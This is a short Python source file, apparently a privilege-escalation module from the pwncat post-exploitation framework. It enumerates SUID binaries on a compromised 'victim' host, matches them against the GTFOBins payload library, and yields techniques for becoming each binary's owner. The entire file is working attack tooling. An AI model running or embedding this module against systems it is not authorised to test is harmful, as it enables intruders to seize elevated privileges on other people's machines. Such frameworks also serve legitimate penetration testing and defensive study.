#!/usr/bin/env python3

import pwncat
from pwncat.gtfobins import Capability, Stream, BinaryNotFound
from pwncat.modules.escalate import EscalateModule, EscalateError, GTFOTechnique


class Module(EscalateModule):
    """
    Utilize binaries marked SETUID to escalate to a different user.
    This module uses the GTFOBins library to generically locate
    payloads for binaries with excessive permissions.
    """

    def enumerate(self):
        """ Enumerate SUID binaries """

        for fact in pwncat.modules.run(
            "enumerate.gather", progress=self.progress, types=["file.suid"]
        ):

            try:
                binary = pwncat.victim.gtfo.find_binary(fact.data.path, Capability.ALL)
            except BinaryNotFound:
                continue

            for method in binary.iter_methods(
                fact.data.path, Capability.ALL, Stream.ANY
            ):
                yield GTFOTechnique(fact.data.owner.name, self, method, suid=True)

    def human_name(self, tech: "Technique"):
        return f"[cyan]{tech.method.binary_path}[/cyan] ([red]setuid[/red])"
